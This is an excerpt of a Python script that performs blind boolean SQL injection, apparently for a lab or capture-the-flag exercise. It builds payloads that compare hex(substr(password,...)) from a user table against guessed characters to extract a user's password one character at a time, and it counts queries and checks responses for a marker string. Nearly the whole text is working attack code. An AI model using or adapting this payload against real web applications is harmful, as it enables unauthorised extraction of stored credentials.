...
def injected_query(payload):
    ...
    total_queries += 1
    return needle.encode() not in r.content # return True if the needle is not in the response

def boolean_query(offset, user_id, character, operator=">"):
    payload = "(select hex(substr(password,{},1)) from user where id= {}) {} hex('{}')".format(offset+1, user_id, operator, character)
    return injected_query(payload)

# Use SQL injection to find if user is valid or not. No value in the real world.
